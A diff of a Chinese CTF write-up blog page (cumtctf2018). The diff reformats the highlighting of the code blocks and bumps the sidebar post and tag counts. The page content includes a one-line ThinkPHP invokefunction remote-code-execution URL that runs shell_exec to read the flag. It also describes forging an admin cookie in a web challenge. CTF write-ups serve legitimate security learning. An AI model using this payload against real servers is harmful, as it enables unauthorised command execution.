@@ -496,12 +496,12 @@
 <p><a href="https://xz.aliyun.com/t/3570" target="_blank" rel="noopener">https://xz.aliyun.com/t/3570</a></p>
 </blockquote>
 <p>题目给出了利用代码，直接尝试一下发现可以回显phpinfo页面，修改参数即可</p>
-<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.219.61.234:10005/public/index.php?s=/Index/\think\app/invokefunction&amp;function=call<span class="emphasis">_user_</span>func<span class="emphasis">_array&amp;vars[0]=shell_</span>exec&amp;vars[<span class="string">1</span>][<span class="symbol"></span>]=cat%20../../../../flag</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.219.61.234:10005/public/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=shell_exec&amp;vars[1][]=cat%20../../../../flag</span><br></pre></td></tr></table></figure>
 <p><img src="/2018/12/21/cumtctf2018/3.png" alt=""></p>
 <hr>
 <p>接下里是web题目的复现</p>
 <h2 id="secret-system"><a href="#secret-system" class="headerlink" title="secret_system"></a>secret_system</h2><p>扫描一下目录，可以找到登录页面，查看源代码可以看到提示</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">*** author: cib_zhinianyuxin.com</span></span><br><span class="line"><span class="comment">*** code: github.com</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> &lt;!--</span><br><span class="line">*** author: cib_zhinianyuxin.com</span><br><span class="line">*** code: github.com</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
 <p>访问github仓库</p>
 <p><img src="/2018/12/21/cumtctf2018/14.png" alt=""></p>
 <p>题目给了test用户的登录密码，登录进去之后发现对应的cookie值，下一步就是伪造admin的cookie了，猜测admin的id应该为1，伪造一下</p>
@@ -780,7 +780,7 @@
                 
                   <a href="/archives">
                 
-                    <span class="site-state-item-count">32</span>
+                    <span class="site-state-item-count">33</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
@@ -848,7 +848,9 @@
                     
                       
                     
-                    <span class="site-state-item-count">13</span>
+                      
+                    
+                    <span class="site-state-item-count">14</span>
                     <span class="site-state-item-name">tags</span>
                   </a>
                 </div>
